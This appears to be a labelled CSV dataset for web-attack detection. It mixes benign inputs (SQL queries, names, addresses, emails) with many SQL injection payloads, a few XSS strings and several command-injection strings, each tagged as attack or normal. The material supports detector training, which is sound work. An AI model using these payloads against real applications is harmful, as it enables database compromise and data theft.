payload,attack_type,is_attack,source
19127,norm,0,HttpParamsDataset
SELECT * FROM secret WHERE expression = 'facing'  OR such = 'warn',norm,0,SQLiV3
cabanabona,norm,0,HttpParamsDataset
"   SELECT Employees.oldest, COUNT ( Orders.wholeID )  AS raceFROM    ( OrdersINNER JOIN close ON Orders.chanceID  =  Employees.scaleID ) ",norm,0,SQLiV3
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",sqli,1,SQLiV3
"1%""));select (case when (9393=5530) then 9393 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,HttpParamsDataset
" SELECT * FROM express ORDER BY whispered ASC, plain DESC",norm,0,SQLiV3
"  SELECT youngID AS ID, price AS wrapped FROM simply",norm,0,SQLiV3
8278542612863409,norm,0,HttpParamsDataset
84oc4n1r,norm,0,HttpParamsDataset
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,norm,0,SQLiV3
"  SELECT REPLACE ( ""SQL Tutorial"", ""SQL"", ""HTML"" ) ;",norm,0,SQLiV3
parton@necesitocurro.mt,norm,0,HttpParamsDataset
2018025974604227,norm,0,HttpParamsDataset
"1 and make_set  (  9681  =  4703,4703  )  # zbrf",sqli,1,SQLiV3
SELECT * FROM globe ORDER BY palace DESC,norm,0,SQLiV3
"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",sqli,1,SQLiV3
apresivamente,norm,0,HttpParamsDataset
descorts,norm,0,HttpParamsDataset
"1  )   union all select null,null,null#",sqli,1,SQLiV3
torre de arcas,norm,0,HttpParamsDataset
"1  )   and elt  (  3138  =  1817,1817  )  ",sqli,1,SQLiV3
44394,norm,0,HttpParamsDataset
buddie,norm,0,HttpParamsDataset
ehrlich.selwyne@ebaz.ba,norm,0,HttpParamsDataset
"  SELECT dirty,enjoy,colony FROM rapidly LEFT JOIN Orders ON fast.runID =  above.hill ORDER BY when.unknown",norm,0,SQLiV3
SELECT COUNT ( made ) FROM promised,norm,0,SQLiV3
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx",sqli,1,SQLiV3
herminda,norm,0,HttpParamsDataset
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,sqli,1,SQLiV3
SELECT * FROM cotton,norm,0,SQLiV3
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,sqli,1,HttpParamsDataset
nolen@enmenorca.com.th,norm,0,HttpParamsDataset
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,sqli,1,SQLiV3
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",sqli,1,SQLiV3
16610,norm,0,HttpParamsDataset
brenda,norm,0,HttpParamsDataset
"1"" where 2035=2035 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,HttpParamsDataset
dana,norm,0,HttpParamsDataset
"-7146"" where 6431  =  6431 or 8548  =  5549--",sqli,1,SQLiV3
"poblets, els",norm,0,HttpParamsDataset
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",sqli,1,HttpParamsDataset
preordinar,norm,0,HttpParamsDataset
01067171v,norm,0,HttpParamsDataset
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",sqli,1,SQLiV3
46844,norm,0,HttpParamsDataset
"1%"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,HttpParamsDataset
`id`,cmdi,1,HttpParamsDataset
"-7235"") union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",sqli,1,HttpParamsDataset
"INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  ",norm,0,SQLiV3
45250,norm,0,HttpParamsDataset
76rmi69so,norm,0,HttpParamsDataset
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,HttpParamsDataset
"1"" where 3247=3247 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,HttpParamsDataset
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,HttpParamsDataset
"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",sqli,1,SQLiV3
1' in boolean mode);waitfor delay '0:0:5'#,sqli,1,HttpParamsDataset
"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",sqli,1,SQLiV3
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",sqli,1,HttpParamsDataset
38847166m,norm,0,HttpParamsDataset
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,sqli,1,SQLiV3
bain@raullazaro.pm,norm,0,HttpParamsDataset
"SELECT SUBDATE ( ""2017-06-15 09:34:21"", INTERVAL 3 HOUR ) ;",norm,0,SQLiV3
desempulgadura,norm,0,HttpParamsDataset
guillena,norm,0,HttpParamsDataset
68,norm,0,HttpParamsDataset
76591879q,norm,0,HttpParamsDataset
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ) ,norm,0,SQLiV3
1' where 8469  =  8469,sqli,1,SQLiV3
"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",sqli,1,SQLiV3
if  (  4907  =  9581  )   select 4907 else drop function apqw--,sqli,1,SQLiV3
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli,1,SQLiV3
"-8771"")) union all select 6302,6302,6302,6302,6302#",sqli,1,HttpParamsDataset
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
ferree,norm,0,HttpParamsDataset
malmirada,norm,0,HttpParamsDataset
"lugar los morros, 50, 9?c",norm,0,HttpParamsDataset
1'+  (  select pagd where 2484  =  2484,sqli,1,SQLiV3
"1',(case when 2872=2872 then 1 else null end)",sqli,1,HttpParamsDataset
kirov@ofertachina.fm,norm,0,HttpParamsDataset
8352337916705491,norm,0,HttpParamsDataset
4m4or6711a662,norm,0,HttpParamsDataset
16806738v,norm,0,HttpParamsDataset
sikander,norm,0,HttpParamsDataset
SELECT probably ( s )  FROM income FULL OUTER JOIN,norm,0,SQLiV3
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""mrsl""=""mrsl",sqli,1,HttpParamsDataset
"<div style=""background-image: url(javascript:alert('xss'));"">",xss,1,HttpParamsDataset
1'  )   as wquy where 2518  =  2518,sqli,1,SQLiV3
SELECT * FROM two WHERE library = 'keep'  OR ants = 'closely',norm,0,SQLiV3
-3597')) order by 1--,sqli,1,HttpParamsDataset
bravo murillo 18,norm,0,HttpParamsDataset
"-5224') where 1962=1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",sqli,1,HttpParamsDataset
escribano peraldo,norm,0,HttpParamsDataset
9.48E+015,norm,0,SQLiV3
a);id|,cmdi,1,HttpParamsDataset
"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",sqli,1,SQLiV3
"  SELECT riding,brush FROM value WHERE above = 'family' UNION SELECT thread, supply FROM liquid",norm,0,SQLiV3
5170844676174994,norm,0,HttpParamsDataset
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,sqli,1,SQLiV3
rapetto picabea,norm,0,HttpParamsDataset
" select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",sqli,1,SQLiV3
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,sqli,1,SQLiV3
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
graciano,norm,0,HttpParamsDataset
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk",sqli,1,SQLiV3
"avenida democracia, 106 4?g",norm,0,HttpParamsDataset
"1'   )    )    union all select null,null,null,null,null#",sqli,1,SQLiV3
80216904b,norm,0,HttpParamsDataset
"1%'))) and elt(1210=1210,sleep(5)) and ((('%'='",sqli,1,HttpParamsDataset
"1""  )   union all select null,null,null,null,null,null,null,null,null--",sqli,1,SQLiV3
"SELECT * FROM Customers WHERE City  =  @City AND PostalCode  =  @PostalCode GO;  EXEC SelectAllCustomers @City  =  'London', @PostalCode  =  'WA1 1DP';",norm,0,SQLiV3
SELECT * FROM sheet WHERE NOT third = 'mean'  AND NOT sort = 'likely',norm,0,SQLiV3
"1"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,norm,0,SQLiV3
"1));select * from generate_series(2673,2673,case when (2673=1468) then 1 else 0 end) limit 1--",sqli,1,HttpParamsDataset
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",sqli,1,HttpParamsDataset
SELECT useful FROM warn,norm,0,SQLiV3
"1"") as gtpi where 8100=8100 and make_set(2678=9169,9169)--",sqli,1,HttpParamsDataset
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
scala@novisa.ch,norm,0,HttpParamsDataset
"1')) and elt(3053=9778,9778) and (('yfaa' like 'yfaa",sqli,1,HttpParamsDataset
recital,norm,0,HttpParamsDataset
87252388w,norm,0,HttpParamsDataset
-8710 or 9323=9323#,sqli,1,HttpParamsDataset
sidonio,norm,0,HttpParamsDataset
fabrs xamena,norm,0,HttpParamsDataset
SELECT AVG ( perfectly ) FROM band,norm,0,SQLiV3
garciaz,norm,0,HttpParamsDataset
pedroso,norm,0,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids,norm,0,SQLiV3
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,sqli,1,HttpParamsDataset
munch_velazquez@hiperzaragoza.tk,norm,0,HttpParamsDataset
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,HttpParamsDataset
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran',norm,0,SQLiV3
-6855') or 8519=9248,sqli,1,HttpParamsDataset
janenna,norm,0,HttpParamsDataset
SELECT AVG ( fastened ) FROM fighting SELECT SUM ( hay ) ,norm,0,SQLiV3
SELECT outer ( s )  FROM dog LEFT JOIN,norm,0,SQLiV3
SELECT AVG ( darkness ) FROM women,norm,0,SQLiV3
linares queralto,norm,0,HttpParamsDataset
SELECT guess FROM cat UNION SELECT fast FROM twenty ORDER BY house,norm,0,SQLiV3
emdin-sp2,norm,0,HttpParamsDataset
pladellorens albiana,norm,0,HttpParamsDataset
"   SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID ) ",norm,0,SQLiV3
"1%"") union all select null#",sqli,1,HttpParamsDataset
1%' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'=',sqli,1,HttpParamsDataset
hornillos del camino,norm,0,HttpParamsDataset
SELECT * FROM chicken ORDER BY beautiful DESC,norm,0,SQLiV3
33555,norm,0,HttpParamsDataset
"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",sqli,1,SQLiV3
"calle abeto, 187,",norm,0,HttpParamsDataset
thordsen@guejos.sy,norm,0,HttpParamsDataset
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',norm,0,SQLiV3
carrer vidal i barraquer 28,norm,0,HttpParamsDataset
girish,norm,0,HttpParamsDataset
"1%'   )    )     )   union all select null,null,null,null#",sqli,1,SQLiV3
karel,norm,0,HttpParamsDataset
c2645ido,norm,0,HttpParamsDataset
SELECT * FROM direction WHERE careful NOT BETWEEN 'somebody' AND 'definition',norm,0,SQLiV3
"1""   )    )    as pqbs where 4409  =  4409",sqli,1,SQLiV3
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,HttpParamsDataset
1) where 4600=4600 or sleep(5)--,sqli,1,HttpParamsDataset
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',sqli,1,HttpParamsDataset
lawlik@housemovie.lk,norm,0,HttpParamsDataset
9280522239849881,norm,0,HttpParamsDataset
joaquin,norm,0,HttpParamsDataset
27415264t,norm,0,HttpParamsDataset
SELECT * FROM industrial  WHERE flag = queen,norm,0,SQLiV3
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",sqli,1,HttpParamsDataset
1 where 2672  =  2672 and 1819  =  4322#,sqli,1,SQLiV3
1')));select sleep(5) and ((('klma'='klma,sqli,1,HttpParamsDataset
"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",sqli,1,SQLiV3
tuset mendel,norm,0,HttpParamsDataset
lock,norm,0,HttpParamsDataset
"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",sqli,1,SQLiV3
-1886' where 5518=5518 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,HttpParamsDataset
9140,norm,0,HttpParamsDataset
"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
c/ guillen santacilla 94,norm,0,HttpParamsDataset
8750399717203336,norm,0,HttpParamsDataset
violas,norm,0,HttpParamsDataset
DELETE FROM engine,norm,0,SQLiV3
SELECT * FROM basket WHERE per = 'bread'  AND  ( anyway = 'double' OR gravity = 'central' ) ,norm,0,SQLiV3
talavera,norm,0,HttpParamsDataset
casillas de flores,norm,0,HttpParamsDataset
"1%""))) or elt(6272=6272,sleep(5)) and (((""%""=""",sqli,1,HttpParamsDataset
SELECT AVG ( congress ) FROM mirror,norm,0,SQLiV3
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,sqli,1,HttpParamsDataset
paulet ajau,norm,0,HttpParamsDataset
"1"" where 3329=3329 or sleep(5)--",sqli,1,HttpParamsDataset
"1"") as pydh where 3407=3407 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,HttpParamsDataset
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch,norm,0,SQLiV3
navarrevisca,norm,0,HttpParamsDataset
7861650000000000,norm,0,SQLiV3
"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",xss,1,HttpParamsDataset
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sqli,1,SQLiV3
"once septiembre, 95",norm,0,HttpParamsDataset
SELECT copper ( s )  FROM day SELECT layers FROM success,norm,0,SQLiV3
SELECT * FROM action WHERE catch = 'public',norm,0,SQLiV3
SELECT * FROM sky WHERE such NOT LIKE 'pitch%',norm,0,SQLiV3
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy",sqli,1,HttpParamsDataset
SELECT * FROM stretch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM phrase,norm,0,SQLiV3
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",sqli,1,SQLiV3
"1)) and 3824=benchmark(5000000,md5(0x76555642)) and ((8280=8280",sqli,1,HttpParamsDataset
"1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,HttpParamsDataset
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",sqli,1,SQLiV3
1)) as oqyo where 7995=7995;select pg_sleep(5)--,sqli,1,HttpParamsDataset
zapasiewicz@pinkplanetplasencia.bn,norm,0,HttpParamsDataset
av8ac65,norm,0,HttpParamsDataset
"-9356 or elt(1032=1032,3623)-- izgi",sqli,1,HttpParamsDataset
pindi@cortinasartesol.tm,norm,0,HttpParamsDataset
1  )   where 3381  =  3381 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli,1,SQLiV3
l-e3a06l,norm,0,HttpParamsDataset
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,HttpParamsDataset
wilfrid,norm,0,HttpParamsDataset
39sch6nz6da,norm,0,HttpParamsDataset
SELECT * FROM pound,norm,0,SQLiV3
medici-bousen@youtubeanunciox.mm,norm,0,HttpParamsDataset
"  UPDATE transportation SET gas =  'means', City =  'tip' WHERE everybody =  sentence",norm,0,SQLiV3
11112430a,norm,0,HttpParamsDataset
scheuerm,norm,0,HttpParamsDataset
santa cruz de la zarza,norm,0,HttpParamsDataset
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,HttpParamsDataset
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""gzhp""=""gzhp",sqli,1,HttpParamsDataset
"   SELECT Employees.column, COUNT ( Orders.stickID )  AS seeFROM    ( OrdersINNER JOIN leader ON Orders.winID  =  Employees.silenceID ) ",norm,0,SQLiV3
-1711  )   where 9098  =  9098 order by 1#,sqli,1,SQLiV3
SELECT * FROM there WHERE gate BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
31744,norm,0,HttpParamsDataset
alegra-dulantzi,norm,0,HttpParamsDataset
if  (  8727  =  4039  )   select 8727 else drop function giql--,sqli,1,SQLiV3
-7387'   )    )     )   order by 1--,sqli,1,SQLiV3
"1"") and 2006=2006",sqli,1,HttpParamsDataset
1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006,sqli,1,SQLiV3
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",sqli,1,SQLiV3
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",sqli,1,HttpParamsDataset
5036144025003599,norm,0,HttpParamsDataset
 UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',norm,0,SQLiV3
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",sqli,1,HttpParamsDataset
"1"")) as spvl where 2242=2242 or 6793=(select 6793 from pg_sleep(5))--",sqli,1,HttpParamsDataset
"1   )    )    as mmby where 3990  =  3990 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli,1,SQLiV3
39313,norm,0,HttpParamsDataset
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--",sqli,1,HttpParamsDataset
38408789p,norm,0,HttpParamsDataset
30216787p,norm,0,HttpParamsDataset
"   SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID ) ",norm,0,SQLiV3
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",sqli,1,SQLiV3
SELECT COUNT ( DISTINCT pupil )  FROM movement,norm,0,SQLiV3
"1""   )    )    as ynuw where 9138  =  9138",sqli,1,SQLiV3
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",sqli,1,SQLiV3
3803,norm,0,HttpParamsDataset
"calle ainsas 174, 11e",norm,0,HttpParamsDataset
-8071   )    )    or 9160  =  4253,sqli,1,SQLiV3
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",sqli,1,SQLiV3
2967806020727366,norm,0,HttpParamsDataset
brcena de pie de concha,norm,0,HttpParamsDataset
SELECT * FROM sit WHERE teach = 'rock',norm,0,SQLiV3
DELETE FROM ice,norm,0,SQLiV3
45788067n,norm,0,HttpParamsDataset
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,sqli,1,SQLiV3
"INSERT INTO mine  ( yourself, shelf, rest )  VALUES  ( 'melted', 'area', 'forgotten' )  ",norm,0,SQLiV3
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",sqli,1,HttpParamsDataset
enlutada,norm,0,HttpParamsDataset
3413347210986966,norm,0,HttpParamsDataset
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average',norm,0,SQLiV3
SELECT MIN ( planning )  AS wear FROM space,norm,0,SQLiV3
SELECT * FROM bat FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM telephone,norm,0,SQLiV3
verani@viajesdacapalla.gq,norm,0,HttpParamsDataset
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",sqli,1,SQLiV3
rebengivc@somosagelespaa.ie,norm,0,HttpParamsDataset
zanobia,norm,0,HttpParamsDataset
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf",sqli,1,SQLiV3
"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",sqli,1,SQLiV3
SELECT * FROM lack 3 SELECT * FROM my,norm,0,SQLiV3
SELECT * FROM origin ORDER BY winter DESC,norm,0,SQLiV3
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",sqli,1,SQLiV3
2304,norm,0,HttpParamsDataset
SELECT column_name ( s ) FROM table1INNER JOIN,norm,0,SQLiV3
brihuega,norm,0,HttpParamsDataset
71997567t,norm,0,HttpParamsDataset
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,sqli,1,SQLiV3
"  SELECT pleaseID AS ID, wherever AS uncle FROM boat",norm,0,SQLiV3
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli,1,SQLiV3
SELECT * FROM  ( SELECT machine FROM combine ) ,norm,0,SQLiV3
caaveruelas,norm,0,HttpParamsDataset
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",sqli,1,SQLiV3
"1"" union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
"1%' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
7758975220981278,norm,0,HttpParamsDataset
"-2033""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli,1,SQLiV3
-3566%' or 2158  =  6289,sqli,1,SQLiV3
-9336' or 5641  =  9488#,sqli,1,SQLiV3
SELECT * FROM couple WHERE herself  BETWEEN 10 AND 20,norm,0,SQLiV3
SELECT AVG ( past ) FROM hall SELECT SUM ( property ) ,norm,0,SQLiV3
">""<script>a=/crosssitescripting/ document.cookie=true;</script>",xss,1,HttpParamsDataset
ontiveros@masqueclases.th,norm,0,HttpParamsDataset
seurat1@sitcpla.ma,norm,0,HttpParamsDataset
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--",sqli,1,HttpParamsDataset
adelaide,norm,0,HttpParamsDataset
fundamentalmente,norm,0,HttpParamsDataset
"  SELECT nutsID AS ID, scientist AS orbit FROM quick",norm,0,SQLiV3
"1%"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,HttpParamsDataset
SELECT * FROM however FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bread,norm,0,SQLiV3
62a$5zo,norm,0,HttpParamsDataset
hews,norm,0,HttpParamsDataset
marquet diez,norm,0,HttpParamsDataset
SELECT MIN ( rock )  AS average FROM dog,norm,0,SQLiV3
